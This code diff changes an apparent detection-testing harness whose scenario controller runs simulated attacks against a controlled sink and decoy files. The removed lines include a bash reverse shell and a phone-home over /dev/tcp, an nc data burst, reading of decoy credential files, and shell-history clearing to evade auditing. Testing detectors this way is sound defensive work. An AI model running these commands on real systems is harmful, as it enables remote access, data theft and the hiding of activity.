@@ -32,23 +32,25 @@ from .scenario_catalog import SCENARIO_CATALOG
 _SCENARIO_LINGER_SECONDS = 50.0
 _EVENT_CONTEXT_GRACE_SECONDS = 5.0
 _EVENT_CONTEXT_HISTORY_LIMIT = 100
-_AUDIT_REMOTE_TIMEOUT_SECONDS = 32
 _AUDIT_CONTROLLER_TIMEOUT_SECONDS = 38.0
 _AUDIT_EVASION_INPUT = "\n".join(
     (
+        "HISTFILE=/tmp/{marker}.history",
+        "export HISTFILE",
+        "trap 'rm -f -- \"$HISTFILE\"' EXIT",
         "set -o history",
         "HISTCONTROL=",
         "HISTIGNORE=",
         "history -s argus-demo-before-clear",
         "history -w",
-        "sleep 7",
+        "python3 -c 'import time; time.sleep(7)'",
         "history -c",
         "history -w",
-        "sleep 7",
+        "python3 -c 'import time; time.sleep(7)'",
         "history -s argus-demo-before-disable",
         "history -w",
         "set +o history",
-        "sleep 10",
+        "python3 -c 'import time; time.sleep(10)'",
         "exit",
     )
 ) + "\n"
@@ -365,93 +367,45 @@ class ScenarioController:
 
     @staticmethod
     def _audit_evasion_execution(marker: str) -> tuple[list[str], str]:
-        history_file = f"/tmp/{marker}.history"
-        marked_bash = f"exec -a {shlex.quote(marker)} bash --noprofile --norc -i"
-        script = (
-            f"HISTFILE={shlex.quote(history_file)}; export HISTFILE; "
-            "trap 'rm -f -- \"$HISTFILE\"' EXIT; "
-            # Keep timeout in the PTY's foreground process group.  Without
-            # --foreground, coreutils timeout puts the interactive Bash in a
-            # separate process group; the terminal echoes input but Bash is
-            # stopped by SIGTTIN and never executes the history commands.
-            f"timeout --foreground -s KILL {_AUDIT_REMOTE_TIMEOUT_SECONDS} "
-            f"bash -c {shlex.quote(marked_bash)}"
-        )
-        return ["/bin/bash", "-lc", script], _AUDIT_EVASION_INPUT
-
-    def _wrap(self, inner: str, marker: str) -> list[str]:
-        # BusyBox applets (netshoot /bin/true) dispatch on argv[0], so
-        # `exec -a <name> /bin/true` fails with "applet not found".
-        # Rename bash instead; Argus still sees the distinctive process names.
-        # Hold the named process for a couple of seconds — Argus DMA sampling
-        # misses instantaneous `bash -c ':'` (Discovery) but catches `bash -i`
-        # (reverse-shell) because that one stays up.
-        script = (
-            f"(exec -a {marker}-start bash -c 'sleep 2'); "
-            f"{inner}; "
-            f"(exec -a {marker}-end bash -c 'sleep 1')"
-        )
-        return ["/bin/bash", "-lc", script]
+        inputs = _AUDIT_EVASION_INPUT.format(marker=marker)
+        return ["/bin/bash", "--noprofile", "--norc", "-i"], inputs
 
     def _script_for(self, scenario_id: str, sink_ip: str, marker: str) -> list[str]:
         port = str(self.settings.sink_port)
         if scenario_id == "exec-memory":
-            inner = f"exec -a {shlex.quote(marker)} python3 /scripts/exec-memory.py"
             return [
-                "/bin/bash",
-                "-lc",
-                f"timeout -s KILL 52 bash -c {shlex.quote(inner)}",
+                "python3",
+                "/scripts/exec-memory.py",
+                "--hold-seconds",
+                "45",
+                "--scenario-marker",
+                marker,
             ]
-        if scenario_id == "phone-home":
-            run_id = marker.rsplit("-", 1)[-1]
-            inner = (
-                "set -e; "
-                f"exec 3<>/dev/tcp/{sink_ip}/{port}; "
-                f"printf '%s\\n' {shlex.quote(run_id)} >&3; "
-                "sleep 20; "
-                "exec 3>&-"
-            )
-            marked_bash = f"exec -a {shlex.quote(marker)} bash -c {shlex.quote(inner)}"
+        if scenario_id in {
+            "discovery",
+            "phone-home",
+            "reverse-shell",
+            "decoy-modify",
+            "network-burst",
+            "compute-simulation",
+        }:
             return [
-                "/bin/bash",
-                "-lc",
-                f"timeout -s KILL 27 bash -c {shlex.quote(marked_bash)}",
+                "python3",
+                "/scripts/run-scenario.py",
+                scenario_id,
+                marker,
+                sink_ip or "-",
+                port,
             ]
-        if scenario_id == "discovery":
+        if scenario_id == "shell-history":
             inner = (
-                "(exec -a argus-gtc-discovery-uname bash -c 'uname -a; sleep 2'); "
-                "(exec -a argus-gtc-discovery-id bash -c 'id; sleep 1'); "
-                "(exec -a argus-gtc-discovery-ps bash -c 'ps aux | head -20; sleep 1'); "
-                "(exec -a argus-gtc-discovery-decoys bash -c '"
-                "echo --- decoys ---; "
-                "cat /decoys/credentials.txt; "
-                "cat /decoys/runbook.txt; "
-                "ls -la /decoys; sleep 2')"
-            )
-        elif scenario_id == "reverse-shell":
-            inner = (
-                f"timeout -s KILL 20 bash -c \"exec -a {marker} "
-                "bash --noprofile --norc -i "
-                f"0<>/dev/tcp/{sink_ip}/{port} 1>&0 2>&0\" "
-                "|| true"
-            )
-        elif scenario_id == "shell-history":
-            inner = (
+                f"export ARGUS_GTC_SCENARIO_MARKER={shlex.quote(marker)}; "
                 "set +o history; export HISTFILE=/dev/null; "
                 "history -c; history -w; echo cleared"
             )
-        elif scenario_id == "decoy-modify":
-            inner = (
-                "echo 'tampered-by-demo' >> /decoys/credentials.txt && "
-                "cat /decoys/credentials.txt"
-            )
-        elif scenario_id == "network-burst":
-            inner = f"dd if=/dev/zero bs=1M count=5 2>/dev/null | nc -w 3 {sink_ip} {port} || true"
-        elif scenario_id == "compute-simulation":
-            inner = "for i in $(seq 1 5000); do echo $((i*i)) >/dev/null; done; echo compute-done"
         else:
             raise ValueError(f"unsupported scenario: {scenario_id}")
-        return self._wrap(inner, marker)
+        return ["/bin/bash", "-lc", inner]
 
     def run(
         self,
